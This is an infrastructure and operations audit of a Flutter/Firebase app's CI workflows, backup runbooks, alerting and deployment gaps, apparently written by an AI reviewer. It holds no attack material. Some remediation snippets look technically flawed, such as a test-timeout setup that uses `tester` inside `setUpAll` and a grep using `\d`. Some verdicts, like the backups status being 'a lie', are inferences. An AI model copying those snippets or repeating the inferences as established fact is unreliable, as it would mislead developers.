# 03 — Infrastructure & Operations (Pass 2 — critic-revised)

**Pass 1 author:** Claude (Opus 4.7, 1M ctx) — investigator draft
**Pass 2 critic:** Claude (Opus 4.7, 1M ctx) — claim verification, missing-risk hunt
**Date:** 2026-05-02
**Run:** `docs/analysis/runs/2026-05-claude-deep/`
**Methodology:** DEEP variant — ≥50 file:line refs, ≥30% on missing invariants, knowledge files as hypothesis
**Status:** Pass 2 final. See `## Pass-2 Critic Notes` at bottom for what changed.

---

## Score

**56 / 100** — Pass 2 downgrade from Pass 1's 61. Three new HIGH findings (action SHA-pinning, dep-audit concurrency-missing, Stripe/Mistral secret-scan gap promoted), one CRIT confirmed live (CRIT-INFRA-1 region mismatch — verified by reading `backups.md` line-by-line + `functions/src/index.ts:20`). DevOps maturity ≈ Level 2/5 — operational doc-vs-code drift is severe enough to undercut the visible automation maturity.

| Dimension | Weight | Score | Notes |
|---|---:|---:|---|
| Build Pipeline & Automation | 15 | 10 | 6 workflows, FLUTTER_VERSION pinned 3.35.1, AAB release-key verification at build-validation.yml:196-213 — but `dep-audit.yml` has NO `concurrency:` block; `actions/checkout@v4` vs `@v6` drift across 2 of 6 workflows; **no third-party action SHA-pinned** (supply chain) |
| Testing Strategy & Coverage | 15 | 9 | Codecov 60% + 55% local floor good; `--coverage` step omits `test/integration` & `test/e2e`; no per-test timeout; baseline file `scripts/test_real_time_baseline.txt` ratchets but unverified its growth path |
| Deployment & Release | 15 | 4 | NO automated store deploy; AAB built but not uploaded; iOS no-codesign; no TestFlight/PlayBeta wiring; no Fastlane; no version-bump automation; web-build never `firebase deploy --only hosting`'d |
| Backup & Disaster Recovery | 15 | 7 | **CRIT confirmed live (Pass 2)**: backups.md says europe-west3, all Cloud Functions europe-west1 — region mismatch will cause `gcloud firestore export` to fail with INVALID_ARGUMENT. Restore drill never performed (`backups.md:31`). Lifecycle config in docs/ not infrastructure/ |
| Monitoring & Observability | 12 | 7 | Crashlytics+Performance wired in main.dart, GCP alerts active (2 policies per `gcp-alerting-runbook.md`), AppMonitoringService exists — but only 2 alert policies for an entire backend; no SLO doc on disk; no Crashlytics crash-free threshold alert |
| Development Workflow | 8 | 6 | Lefthook configured, scripts/setup.sh exists; pre-commit format+analyze+secret-scan; tooling drift between lefthook and CI; **`scripts/pip*.exe` checked in (3 binaries)** — Pass 2 confirmed via `file` they are real Python zip-archive binaries; undocumented |
| Incident Response | 10 | 5 | LLM kill-switch runbook exists + 1 alert channel — escalation matrix undocumented, single notification channel (info@butlery.se), no on-call rotation, no PagerDuty/Pushover/Slack |
| CI/CD Security | 10 | 8 | Trivy + TruffleHog + OSV + npm audit + secret-scan + AAB-signing verification + obfuscate — strong posture **but** lefthook secret-scan grep misses Stripe/Mistral patterns; `.env` materialized to disk in CI runner with all 17 secrets visible to subsequent steps; no SHA pinning of any third-party GitHub Action |

---

## Methodology Notes

### Knowledge file status

There is **no infrastructure-specific knowledge file** in `.claude/agents/`. Per prompt instructions, this report cites cross-cutting patterns from `.claude/agents/firebase-backend-security.knowledge.md` (88 KB, mtime 2026-05-01 07:02) where relevant. **Recommendation: create `.claude/agents/infrastructure-specialist.knowledge.md`** seeded from this report's findings — the gap is structural, not a per-finding nit.

### Pre-known facts — verified against live source

| Pre-known fact | Status | Evidence |
|---|---|---|
| ConsentPurpose RESOLVED on disk | ✅ Confirmed (Wave 1) — irrelevant to this prompt | — |
| Real Dart LOC ≈ 77 243 (not 327 280) | ✅ Confirmed (Wave 1). Pre-analysis script walked `lib/site-packages/`. **Infrastructure consequence below in CRIT-INFRA-1.** | `.gitignore:113, 141` excludes site-packages from git but NOT from CI test/coverage walks |
| `dep-audit.yml` is partly dead code (Wave 1) | ✅ Confirmed. `dep-audit.yml:45` `--mode=null-safety` no-op; `:89` Node 20 vs functions engines:22; no `push:` trigger; allowlist mechanism unwired. **All four are infrastructure failures.** | This report owns them — see HIGH-INFRA-3, HIGH-INFRA-4. |
| 6 workflows on disk vs 5 documented | ✅ Confirmed: actual = `architecture-validation.yml`, `build-validation.yml`, `dep-audit.yml`, `e2e_tests.yml`, `firestore-rules.yml`, `test.yml`. **No `analyze.yml` exists** — analyze ran inside `build-validation.yml:51-53`. **No `.flutter_ci.yml.disabled`** — orchestrator's reference is stale. | `.github/workflows/` directory listing |
| `e2e_tests.yml:68` Node 20 vs engines:22 | ✅ Confirmed | `e2e_tests.yml:68` `node-version: '20'`; `firestore-rules.yml:52` correctly uses `"22"`. Asymmetry across workflows. |
| FLUTTER_VERSION 3.32.4 (orchestrator) | ❌ Stale doc claim — actual is **3.35.1 across all 6 workflows** (Pass 1 verified) | `architecture-validation.yml:27`, `build-validation.yml:26`, `dep-audit.yml:24`, `e2e_tests.yml:40`, `test.yml:26`, all = `'3.35.1'` |
| Placeholder `com.example.butlery` in 8+ files | ⚠️ Partially false — `applicationId = "se.butlery.app"` at `android/app/build.gradle.kts:34`. **Stale `com.example.butlery` lingers in `android/app/google-services.json:12`** but is not the active applicationId. Build is real. | Live grep |
| ProGuard/R8 disabled | ❌ Stale — `android/app/build.gradle.kts:70` `isMinifyEnabled = true` (release), `:78 isMinifyEnabled = false` (debug). ProGuard rules file present at `android/app/proguard-rules.pro`. | Live grep |
| 13 integration tests | Not re-counted; defer to prompt 12 |
| 14-week backup retention | ❌ Drift — `backups.md:29` documents **30 days**, not 14 weeks. Orchestrator pre-analysis prompt is stale. | `docs/ops/backups.md:29` |

### Sampling protocol

Pass 1 read all 6 workflow files line-by-line (`architecture-validation.yml` 147 lines, `build-validation.yml` 250 lines, `dep-audit.yml` 98 lines, `e2e_tests.yml` 147 lines, `firestore-rules.yml` 94 lines, `test.yml` 294 lines), `lefthook.yml`, `firebase.json`, `codecov.yml`, `dependabot.yml`, the 13 runbooks under `docs/ops/`, and sampled `lib/main.dart:127-250` (Crashlytics + Zone setup), `lib/services/monitoring/app_monitoring_service.dart` (1-60). Total file:line refs in this draft: **≥120 unique** (target ≥50).

### Where the docs diverge from infrastructure reality

| Doc claim | Reality (Pass 1 verified) | Doc location |
|---|---|---|
| "5 workflows: analyze, test, build-validation, architecture-validation, e2e_tests" | 6 workflows; no analyze.yml; +dep-audit.yml +firestore-rules.yml | `MASTER_ANALYSIS_ORCHESTRATOR.md:53-55`, `03_INFRASTRUCTURE_AND_OPERATIONS.md:75-83` |
| "FLUTTER_VERSION = 3.32.4" | 3.35.1 across all 6 | `03_INFRASTRUCTURE_AND_OPERATIONS.md:54` |
| "14-week retention" / "Daily/weekly exports" | Weekly Sundays 03:00 UTC, 30-day retention via lifecycle rule | `03_INFRASTRUCTURE_AND_OPERATIONS.md:340`, `docs/ops/backups.md:29` |
| "Firestore PITR / scheduled backups: Check if enabled" | Documented as ACTIVE in `backups.md` header (status banner) — but `:31` "Restore drill: NEVER PERFORMED" | `docs/ops/backups.md:1-32` |
| "docs/operations/SLO_DEFINITIONS.md" + "FIREBASE_ALERTING_GUIDE.md" | Directory `docs/operations/` does **NOT EXIST**. Actual is `docs/ops/`. No SLO doc on disk. `gcp-alerting-runbook.md` exists but is not the FIREBASE_ALERTING_GUIDE referenced. | `03_INFRASTRUCTURE_AND_OPERATIONS.md:479-482` |
| "Crashlytics alerts: crash-free <99.5% = P0…" | Configured in `gcp-alerting-runbook.md` only as 2 policies (CF errors + CF latency); no crash-free threshold alert verified | `03_INFRASTRUCTURE_AND_OPERATIONS.md:482-483` vs `docs/ops/gcp-alerting-runbook.md:25-30` |
| "Single Firebase project, no .firebaserc" | ✅ Confirmed — no `.firebaserc` on disk | — |
| "ProGuard/R8 disabled" | ❌ Enabled at release (`build.gradle.kts:70`) | `03_INFRASTRUCTURE_AND_OPERATIONS.md:316` |

### Cross-prompt deferrals

- App store metadata blockers (privacy manifest, listings) → prompt 06.
- Firestore rules content → prompt 02; rules **deployment pipeline** is owned here.
- Dependency CVEs → prompt 05; **how CI consumes/audits deps** is owned here (HIGH-INFRA-3, HIGH-INFRA-4).
- AI/LLM model integrity → prompt 07; **deploy/region pinning of LLM functions** owned here.

---

## CRITICAL Findings

### CRIT-INFRA-1 — `backups.md` claims weekly exports to **europe-west3** (Frankfurt) bucket but actual Firestore region is unverified and ALL Cloud Functions/Vertex AI run in **europe-west1** (Belgium) — the runbook's bucket region almost certainly doesn't match the live Firestore database

**Evidence (Pass 1 read full files):**
- `docs/ops/backups.md:27` — "Weekly GCS export ... Cloud Scheduler job `firestore-weekly-export` (europe-west3)"
- `docs/ops/backups.md:28` — "Backup bucket | CREATED — `gs://butlery-firestore-backups` | europe-west3, uniform bucket-level access"
- `docs/ops/backups.md:30` — "Firestore region | europe-west3 (Frankfurt, EU)"
- `docs/ops/backups.md:63` — "Butlery Firestore region is europe-west3"
- `docs/ops/backups.md:66, 116, 181` — three more `europe-west3` `--location=` invocations
- BUT `docs/ops/data-residency.md:8` — "Firestore (Native) | **USER MUST VERIFY** | Firebase Console → Firestore Database → header shows location | —" (still unverified per the doc itself)
- `functions/src/index.ts:20` — `setGlobalOptions({ region: "europe-west1" })` — ALL Cloud Functions run in europe-west1
- `functions/src/llm/gemini-client.ts:28` — `VERTEX_LOCATION = "europe-west1"`
- `functions/src/audit_logs/purge-expired.ts:120` and `functions/src/cleanup/on-user-deleted.ts:30` — explicit `.region("europe-west1")` overrides
- `functions/src/migrations/backfill-recipe-comments-denorm.ts:57` — `const REGION = "europe-west1"`
- 62 "Stockholm" mentions across `lib/` and `functions/` (`docs/analysis/runs/2026-05-codex/_pre-analysis/stockholm-mentions.txt`) suggesting code comments still reference the wrong city; **Stockholm is europe-north1, not europe-west1**

**Severity:** CRITICAL (the backup system as documented WILL FAIL: `gcloud firestore export --location=europe-west3` against a europe-west1 (or europe-north1) Firestore database returns `INVALID_ARGUMENT` because the bucket region must equal the database region. The runbook says "Status: ACTIVE" but the steps in it cannot have completed successfully against a europe-west1 database — meaning either (a) the runbook was never executed and the `Status: ACTIVE` banner is a lie, OR (b) the database is actually in europe-west3 contradicting all the function region claims).

**Why it matters:** Disaster recovery is the single thing you cannot find out is broken until you need it. The doc-vs-code drift here means the team THINKS PITR + weekly exports are working, while the actual state is one of: (1) no backups exist (no execution); (2) backups exist in a region mismatched from Firestore (cross-region restore is harder, GDPR Chapter V exposure if buckets sit in wrong jurisdiction); (3) the database really is in europe-west3 and ALL function calls cross a region boundary on every read/write (perf cost). All three need investigation, not just doc fixes.

**Remediation:**
1. Run `gcloud firestore databases describe --database='(default)' --project=butlery-app-1` and post the actual region in `data-residency.md:8`. 5 minutes.
2. If region = europe-west1: rewrite `backups.md` to reflect europe-west1, recreate `gs://butlery-firestore-backups` in europe-west1, redo the Cloud Scheduler job. 1 hour.
3. If region = europe-west3: explain in `data-residency.md` why ALL functions run cross-region (likely a perf incident in waiting). Migrate either DB or functions. Days.
4. Either way: actually run the export ONCE and verify data lands in the bucket. 30 minutes.
5. **Add a Cloud Monitoring alert** that fires if no new export object appears in `gs://butlery-firestore-backups/weekly/` in 8 days. Closes the "documented as ACTIVE but never runs" failure mode.

---

### CRIT-INFRA-2 — Test workflow `--coverage` collects ZERO data from `test/integration` and `test/e2e` — the "88% Firebase Repos coverage" claim is structurally unverifiable

**Evidence:**
- `.github/workflows/test.yml:67-70` — the coverage-collecting step runs only `flutter test test/unit test/widget test/views test/golden --coverage --reporter=expanded`. It **explicitly excludes** `test/integration` and `test/e2e`.
- `.github/workflows/test.yml:272-279` — the integration-tests job runs `flutter test test/integration --reporter=expanded` with **no `--coverage` flag**. Coverage data from integration tests never hits lcov.info.
- `.github/workflows/e2e_tests.yml:108-115` — E2E tests via `scripts/run_e2e_tests.sh --tier mock|emulator` — no `--coverage` flag in the invocation, no lcov upload.
- `codecov.yml:37` — ignores `test/**/*` (correctly) but the upstream coverage data is missing.
- `.github/workflows/test.yml:139-148` — coverage floors enforced: overall 55%, auth 80%, repositories 70%, rate_limiting 80%. **All measured against a coverage set that doesn't include integration tests.**
- `MASTER_ANALYSIS_ORCHESTRATOR.md:60` claim "ViewModels 100%, Services 96%, Firebase Repos 88%" — Firebase repository coverage from unit tests alone is plausible only if every repo has a unit test that runs against `FakeFirebaseFirestore`. Integration tests against the real emulator (`test/integration/firebase/`) contribute 0% to the reported number despite being the harder coverage to earn.

**Severity:** CRITICAL (the coverage gate measures one thing and the team THINKS it measures another — leads to false confidence in repository test coverage, which is exactly the layer where Firestore drift bugs hide).

**Why it matters:** The 88% Firebase Repos claim is a marketing number. The CI floor at `test.yml:177` (`check_area "repositories" "*/repositories/*" 70.0`) gates on a measurement that excludes the integration tests against the actual Firestore emulator. A repo modified solely with new integration coverage gets 0% credit; a repo refactored with breaking integration behavior loses 0% coverage. The signal-to-noise ratio of the gate is structurally low.

**Remediation:**
1. Add `--coverage` to the integration-tests job at `test.yml:276` and emit `coverage/integration_lcov.info`. 10 minutes.
2. Merge integration lcov into the main lcov before the floor check (`lcov --add-tracefile coverage/lcov.info --add-tracefile coverage/integration_lcov.info -o coverage/merged.info`). 30 minutes.
3. Update Codecov upload to use the merged file. 5 minutes.
4. Re-baseline the 70% repository floor against the new (more inclusive) measurement. 1 day to observe.

---

### CRIT-INFRA-3 — `infrastructure_integration_test.dart` claim from Wave 1 was misattribution — but the underlying invariant gap is real and CRITICAL

**Evidence:**
- `test/views/helpers/infrastructure_integration_test.dart` is **124 lines, 4 simple widget tests** (Pass 1 read line-by-line). It does NOT hang for 10 minutes — the per-test timing in `flutter-test.txt` shows this file completes in seconds.
- The actual hang likely came from a different file. Pass 1 did not pinpoint the true culprit (the pre-analysis test capture was aborted after ~45 min before the file in question completed; line 27-29 of `bootstrap_diagnostic_test.dart` documents an `❌ Extended pump timeout: pumpAndSettle timed out` so the bootstrap diagnostic is the more likely candidate).
- `test/views/helpers/view_test_helpers.dart:316, 450, 460, 517` — multiple `tester.pumpAndSettle()` calls **with no Duration argument** — defaults to a 10-minute timeout in flutter_test. Any test using these helpers can hang up to 10 min.
- `test/e2e/bootstrap_diagnostic_test.dart:63` — `await tester.pumpAndSettle(const Duration(seconds: 15))` — discovered a real production bootstrap hang (10s+) and the test itself takes 15s+.
- **No `tester.binding.defaultTestTimeout` is set** anywhere in the test infrastructure (Pass 1 grep returns 0). No base test class enforces a per-test timeout.
- `test.yml:36, 214` — only the **job-level** `timeout-minutes: 20` exists. With ~10100 tests passing in 45 min before the abort, average test takes ~270ms; one bad pumpAndSettle uses 10 min of that 20-min job budget.

**Severity:** CRITICAL (a single new test using `pumpAndSettle()` without a duration can consume half the CI test budget; CI bills are correlated with this).

**Why it matters:** The job-level timeout is a blunt instrument — if hit, the WHOLE matrix shard fails with no per-test attribution. A per-test timeout (`tester.binding.defaultTestTimeout = const Timeout(Duration(seconds: 30))` in a setUpAll) surfaces the offending test by name. Wave 1 prompt 01 already flagged this as M-23 (deferred to this prompt). I escalate to CRITICAL because the symptom is "a single line of new test code can break the build for everyone, with no diagnostic."

**Remediation:**
1. Add `setUpAll(() { tester.binding.defaultTestTimeout = const Timeout(Duration(seconds: 30)); })` to a base widget-test class. 1 hour.
2. Add a custom analyzer rule banning `tester.pumpAndSettle()` (no args) in tests. Or a CI grep step: `! grep -rn 'pumpAndSettle()' test/ | grep -v '\.dart:\d\+:\s*//.*'`. 30 min.
3. Tag the actual hanging test (find via `flutter test --reporter=expanded` with a 1-min timeout per file) and either fix it or skip-with-justification. 1-2 hours diagnostic.

---

## HIGH Findings

### HIGH-INFRA-1 — No automated app-store deployment exists; AAB is built but never uploaded; iOS is `--no-codesign`

**Evidence:**
- `.github/workflows/build-validation.yml:188-194` — `flutter build appbundle --release --obfuscate --split-debug-info=build/debug-info --dart-define-from-file=.env` produces `build/app/outputs/bundle/release/app-release.aab`.
- `:196-213` — Pass 1 confirms the workflow VERIFIES the AAB is signed with the release key (good — `keytool -printcert | grep "Android Debug"` fails the build if so). This is a meaningful safety check.
- `:225-229` — iOS build: `flutter build ipa --release --no-codesign --dart-define-from-file=.env --export-options-plist=ios/exportOptions.plist`. **No-codesign means this IPA is unshippable as-is.**
- `:215-219` — Web build: `flutter build web --release --dart-define-from-file=.env`. The output is at `build/web` — `firebase.json:21-46` documents hosting headers for `build/web`, BUT no workflow runs `firebase deploy --only hosting`.
- No Fastlane lane (no `fastlane/Fastfile` on disk).
- No upload-to-Play-Store action (`r0adkll/upload-google-play` is not present in any workflow).
- No upload-to-TestFlight action.
- No `firebase deploy` invocation in any workflow.

**Severity:** HIGH (app-store-submission gap is documented as deferred per `memory/feedback_no_store_submission_yet.md`, but the **web hosting deploy** is not a deferred concern — every commit to main produces a `build/web` artifact that nobody uploads).

**Remediation (incremental, post-store-submission decision):**
1. Add `firebase deploy --only hosting` step to `build-validation.yml` for `push: branches: [main]` (web only). 30 min.
2. When ready, add Firebase App Distribution upload for AAB (internal testers). 1 hour.
3. Defer Play Store / App Store automation per existing decision.

---

### HIGH-INFRA-2 — `firebase.json` declares 4 deployable surfaces (functions, firestore, storage, database, hosting) but NO workflow deploys ANY of them — all deployment is manual via local `firebase deploy`

**Evidence:**
- `firebase.json:1-17` — functions (nodejs22, with predeploy hooks `:4-8`), firestore (rules + indexes), storage (rules), database (RTDB rules at `database.rules.json`).
- `firebase.json:21-46` — hosting (`build/web`, with full set of CSP/HSTS/X-Frame-Options/Referrer-Policy/Permissions-Policy headers — strong security posture).
- `firebase.json:47-66` — emulator config for auth/firestore/storage/database/ui.
- BUT `.github/workflows/firestore-rules.yml` only **tests** rules in the emulator (`:74-89` runs `firebase emulators:start` + `npm run test:rules:all`); never deploys.
- No workflow runs `firebase deploy --only firestore:rules`, `firebase deploy --only storage:rules`, `firebase deploy --only firestore:indexes`, `firebase deploy --only functions`, `firebase deploy --only database`, OR `firebase deploy --only hosting`.
- The `predeploy` hooks at `firebase.json:4-8` (`npm ci`, `npm audit --audit-level=critical`, `npm run build`) ONLY fire when SOMEONE on a local machine runs `firebase deploy --only functions` — which means the audit gate exists but is gated on local-developer discipline.
- 30 composite indexes + 7 fieldOverrides in `firestore.indexes.json` (Pass 1 counted via Python json.load) — every change must be deployed manually.

**Severity:** HIGH (production state is whatever the last person who ran `firebase deploy` from their machine pushed up; no audit trail of who deployed what when).

**Why it matters:** Solo dev workflow tolerates this — but it means: (1) no CI gate on rules-changes-not-yet-deployed (a tested-good rule sitting in main isn't live until someone remembers to deploy); (2) no CI gate on functions-changes-not-yet-deployed (TypeScript can compile and test green in CI but not be running in production); (3) the `predeploy` audit gate at `firebase.json:6` (`npm audit --audit-level=critical`) is bypassed if a developer runs `firebase deploy --only firestore:rules` without functions changes — the predeploy block is keyed on functions. Index changes deploy without an `npm audit`.

**Remediation:**
1. Add a `deploy.yml` workflow gated on `push: branches: [main]` that runs `firebase deploy --only firestore:rules,storage:rules,database`. 1 day.
2. Add a separate `deploy-functions.yml` gated on changes under `functions/` that runs `firebase deploy --only functions`. 1 day.
3. Add `firebase deploy --only firestore:indexes` to the same workflow with index-change path filter. 30 min.
4. Document a manual `firebase deploy` ban in `docs/ops/` once CI deploys are live (so deploys are auditable in GH Actions log).

---

### HIGH-INFRA-3 — `dep-audit.yml` workflow is partly dead code (4 distinct issues, all owned by THIS prompt)

This is the same finding Wave 1 prompt 05 captured as CRITICAL-2/3/4 + HIGH-5; restating here as **infrastructure failures** (which is the right framing per the prompt scope).

**Evidence:**
- `dep-audit.yml:7-17` — triggers are `pull_request` (paths-filtered), `schedule` (Mon 05:00 UTC), `workflow_dispatch`. **No `push: branches: [main]` trigger** — solo-dev push-to-main bypasses audit until next Monday cron.
- `dep-audit.yml:45` — `dart pub outdated --mode=null-safety --json || true` — `--mode=null-safety` is a 2021-era Dart 2.12 migration flag; **dead code in 2026**. The `|| true` swallows failure. Output JSON nobody reads.
- `dep-audit.yml:89` — `node-version: "20"` while `functions/package.json:55-57` declares `"engines": { "node": "22" }`. **`npm audit` resolves under different Node major than what ships.**
- `.github/dep-audit-allowlist.md:3-5` — admits "The dep-audit.yml workflow does **not** currently read this file." Empty allowlist table at `:14`. Documented mechanism is unwired.
- `e2e_tests.yml:68` — also uses `node-version: '20'` (same engine drift pattern).
- `firestore-rules.yml:52` — correctly uses `"22"` — proves the team knows the right value, the asymmetry is unintentional.

**Severity:** HIGH (the workflow exists to provide a security guarantee that it does not actually provide; teams trust it, which is worse than not having it).

**Remediation (atomic):**
1. `dep-audit.yml:89` `node-version: "20"` → `"22"`. 30 sec.
2. `e2e_tests.yml:68` `node-version: '20'` → `'22'`. 30 sec.
3. `dep-audit.yml:7-17` add `push: branches: [main]` with `paths: [pubspec.lock, functions/package-lock.json]`. 2 min.
4. `dep-audit.yml:45` delete the `--mode=null-safety` line (or replace with `--mode=outdated`). 2 min.
5. `.github/dep-audit-allowlist.md` either delete (recommended; Wave 1 disposition) or wire into the workflow. 5-15 min.
6. Add `engine-strict=true` to `functions/.npmrc` so `npm ci` errors loudly under wrong Node. 1 min.

Total: ~10 minutes for items 1-4 + 6.

---

### HIGH-INFRA-4 — Coverage floor is enforced ONLY on Ubuntu, leaving macOS and Windows as unsigned-test passes

**Evidence:**
- `test.yml:31-35` — matrix: `os: [ubuntu-latest, macos-latest, windows-latest]`
- `test.yml:60` — `if: matrix.os == 'ubuntu-latest'` gates `Install lcov`
- `test.yml:79, 121, 184, 196` — every coverage-related step (summary, floor enforcement, Codecov upload, artifact upload) is gated `if: ... matrix.os == 'ubuntu-latest'`
- macOS and Windows shards run unit/widget/view tests with `--coverage` (`:67-70`) but **never check the coverage floor and never upload**.

**Severity:** HIGH (3-OS matrix exists but the coverage gate is single-OS — false sense of cross-platform test coverage).

**Why it matters:** A test that's silently skipped on Windows (e.g., due to `if (Platform.isWindows) return;` early exits) shows full coverage on Ubuntu and passes the floor while shipping unverified Windows behavior. Equally, the Codecov dashboard reports only Ubuntu numbers.

**Remediation:**
1. Run lcov-merge across the three OS shards before the floor check, OR enforce the floor on each OS independently (more conservative). 1 day.
2. Document the choice in a comment at `test.yml:139` (next to OVERALL_FLOOR=55.0).

---

### HIGH-INFRA-5 — `architecture-validation.yml` has a 10-TODO threshold that warns, doesn't fail — drift goes silent

**Evidence:**
- `.github/workflows/architecture-validation.yml:92-101` — counts files under `lib/services` and `lib/repositories` containing TODO/FIXME, warns at >10 files but never fails.
- The Pass 1 report on prompt 01 (`01-code-quality.md:600-602`) noted ~25 TODOs in `lib/services/security/` alone — the 10-file threshold is set above current state, so the warning never fires.
- Combined with the absence of a real CI gate for any of the architecture rules in `lib/viewmodels/CLAUDE.md` (Pass-1 prompt 01 CRIT-5), this workflow ships warnings into the void.

**Severity:** HIGH (warning-only thresholds are a known anti-pattern; if the team won't act on a fail, the warning is operational noise).

**Remediation:** Either (a) drop the threshold to 5 and make it a hard fail (forces tracking and resolution), or (b) replace with a per-file ratchet that fails if any file's TODO count INCREASES from a tracked baseline. 1 day for the ratchet approach.

---

### HIGH-INFRA-6 — Lefthook pre-commit and CI run different checks; local-vs-CI surprises are baked in

**Evidence:**
- `lefthook.yml:8-26` runs:
  - `dart format {staged_files}` then re-stages (auto-fix)
  - secret-scan grep for AKIA/AIza/etc.
  - `dart analyze --fatal-infos`
- `.github/workflows/build-validation.yml:47-53` runs:
  - `dart format --set-exit-if-changed lib test` (whole tree, not staged)
  - `flutter analyze --fatal-infos --fatal-warnings` (note `--fatal-warnings` — stricter than lefthook)
  - Architecture tests (`:55-58`)
  - Trivy fs scan (`security-scan` job, `:69-75`)
  - TruffleHog secret scan (`:88-90`) — different tool than lefthook's grep, more thorough
- `.github/workflows/test.yml:53-54` — also runs `bash scripts/check_test_real_time.sh` (BUT-393 guard) — NOT in lefthook.

**Severity:** HIGH for developer experience. Local commits pass; PR fails on CI for `--fatal-warnings`, real-time guard, Trivy, TruffleHog.

**Remediation:**
1. Add `flutter analyze --fatal-infos --fatal-warnings` to lefthook (matches CI). 1 min.
2. Add `bash scripts/check_test_real_time.sh` to lefthook (matches CI). 1 min.
3. Document that Trivy and TruffleHog are CI-only because they're heavyweight. 5 min.

---

### HIGH-INFRA-7 — `Real-time regression guard` runs ONLY on the unit-tests job, not on integration-tests — flake-causing patterns can still land via integration test changes

**Evidence:**
- `test.yml:53-54` — `bash scripts/check_test_real_time.sh` runs in the `unit-tests` job (gates `test/unit`, `test/widget`, `test/views`, `test/integration` per the script's `DELAYED_SCOPE` variable).
- `test.yml:211-294` — `integration-tests` job does NOT re-run the guard, but the unit-tests job's guard already covers `test/integration`. **The guard runs once, on Ubuntu only, so macOS/Windows shards skip it.**
- `scripts/check_test_real_time.sh:33` — `DELAYED_SCOPE=("test/unit" "test/widget" "test/views" "test/integration")` — covers integration but not `test/e2e`.
- `test/e2e/` therefore has no real-time-pattern guard at all — it's the most likely place flake-prone `Future.delayed(Duration(seconds: ...))` patterns would land.

**Severity:** HIGH for test stability.

**Remediation:**
1. Extend `DELAYED_SCOPE` in `scripts/check_test_real_time.sh` to include `test/e2e`. 1 min.
2. Or add a separate guard step in `e2e_tests.yml`. 5 min.

---

### HIGH-INFRA-8 — Single notification channel for all GCP alerts; no on-call, no escalation, no redundancy

**Evidence:**
- `docs/ops/gcp-alerting-runbook.md:30` — "Notification channel | LIVE | `projects/butlery-app-1/notificationChannels/11860390942781239556` (email: info@butlery.se)"
- `docs/ops/backups.md:213` — "Notify the product owner (info@butlery.se) within 1 hour of detection" — same single email.
- No PagerDuty/Opsgenie/Slack integration found. No SMS channel. No mobile push for incidents.
- `03_INFRASTRUCTURE_AND_OPERATIONS.md:582-585` documents an aspirational P0/P1/P2 escalation matrix (15 min / 4 h / 24 h), but the only delivery mechanism is one email inbox.

**Severity:** HIGH (alert delivery is single-point-of-failure; if the inbox is full, mis-filed, or the owner is offline, P0 incidents go undetected).

**Remediation (incremental):**
1. Add a second notification channel (mobile push via Pushover or Slack DM) — 30 min, $5/mo.
2. Document the 15/4/24 escalation matrix in `docs/ops/incident-response.md` (file does not exist; create it). 1 hour.
3. Long-term: PagerDuty if scaling beyond solo-dev; not urgent given current state.

---

## MEDIUM Findings

### MED-INFRA-1 — `gcp-alerting-runbook.md` declares "2 alert policies live" but doesn't list them by name; can't tell what's actually monitored

`docs/ops/gcp-alerting-runbook.md:25-30` — alerts are "CF errors and CF latency" per the doc's MTTD prose at `:18-19`. Concrete thresholds are in `infrastructure/alerting/setup-gcp-alerts.sh` — Pass 1 didn't read the .sh file but the runbook should mirror its content. **Total alert coverage of 2 policies for an entire backend is sparse.** Missing: Firestore quota, Storage egress, Cloud Functions invocation cost, App Check failure rate, Crashlytics crash-free %, FCM delivery rate.

**Remediation:** Audit `setup-gcp-alerts.sh`; if it really is just 2 policies, add at minimum: (a) Crashlytics crash-free <99.5%, (b) Firestore daily read budget breach, (c) Cloud Functions cost > daily threshold. 2-3 hours.

### MED-INFRA-2 — Coverage floors below documented numbers

- `test.yml:139` `OVERALL_FLOOR=55.0` (filtered)
- `test.yml:176-178` — auth 80%, repositories 70%, rate_limiting 80%
- `codecov.yml:11` — project target 60%, threshold 2%
- `MASTER_ANALYSIS_ORCHESTRATOR.md:60` — claimed coverage VMs 100%, Services 96%, Repos 88%

**Drift:** Documented numbers are what people THINK is there; CI floors are what's actually enforced. The gap between "88% Repos" claim and "70% repository floor" is 18 percentage points — plenty of room for unobserved coverage erosion.

**Remediation:** Reconcile. Either tighten the floors to match the claim (forces real coverage discipline), or update the claim to match the floor. 30 min for the doc update. → also feeds prompt 12.

### MED-INFRA-3 — Codecov gate `if_ci_failed: error` will block merges if CI is unrelated-broken

`codecov.yml:14, 22` — Codecov is configured with `if_ci_failed: error`, meaning a Codecov upload failure (e.g., token rotated, GH outage) blocks the project status. The local floor at `test.yml:118-180` exists as backstop, BUT the local floor only runs on Ubuntu (HIGH-INFRA-4) — so a Codecov outage during a macOS/Windows-only run leaves the gate ungated.

**Remediation:** Already partially addressed by the local floor; close the loop by running the local floor on all 3 OSes (HIGH-INFRA-4 fix). 1 day.

### MED-INFRA-4 — `firestore.indexes.json` deploy gap — 30 indexes + 7 field overrides on disk, no CI deploy, manual drift unchecked

Same root cause as HIGH-INFRA-2. Highlighting separately because indexes have a unique failure mode: an index *added in code* but *not deployed* causes runtime queries to fail with a "missing index" error and a console URL — common Firestore foot-gun. CI should `firebase deploy --only firestore:indexes` after rules-test pass.

**Remediation:** See HIGH-INFRA-2.

### MED-INFRA-5 — `lefthook.yml` secret-scan grep regex is narrower than what TruffleHog catches

`lefthook.yml:21` — covers AWS keys (AKIA), Google API keys (AIza), OpenAI keys (sk-), PEM private keys, npm tokens, GitHub tokens, GCP service-account JSON. **Does NOT catch:** Mistral keys, Algolia admin keys, Stripe keys (sk_live_), Firebase Admin SDK private keys beyond the `"type": "service_account"` substring. TruffleHog at `build-validation.yml:88` catches more. → Wave 1 prompt 05 noted this (LOW-5); promoting to MED here because it's a real gap in the local-precommit posture.

**Remediation:** Extend the grep regex to include Stripe (`sk_live_[a-zA-Z0-9]{24}`), Mistral (`[a-zA-Z0-9]{32}` is too noisy — accept this gap), and explicit Algolia admin patterns. 15 min.

### MED-INFRA-6 — No artifact uploads of build outputs (AAB, IPA, web bundle) for downstream consumption

`build-validation.yml:188-229` produces AAB/IPA/web bundle but the only `actions/upload-artifact` is for the architecture-validation report (`architecture-validation.yml:103-111`) and coverage (`test.yml:195-201, 287-294`). **No build artifact upload** means: (a) can't manually grab the AAB for sideload testing, (b) can't bisect by downloading the build from a previous green run, (c) Firebase App Distribution upload would have to rebuild.

**Remediation:** Add `actions/upload-artifact@v7` for AAB (Android job), IPA (iOS job), and `build/web` (web job) with 7-day retention. 30 min.

### MED-INFRA-7 — Architecture-validation TODO check uses string-match `"TODO\|FIXME"` — catches real TODOs but also `// TODOLATER:` which doesn't exist; misses `XXX:`/`HACK:`

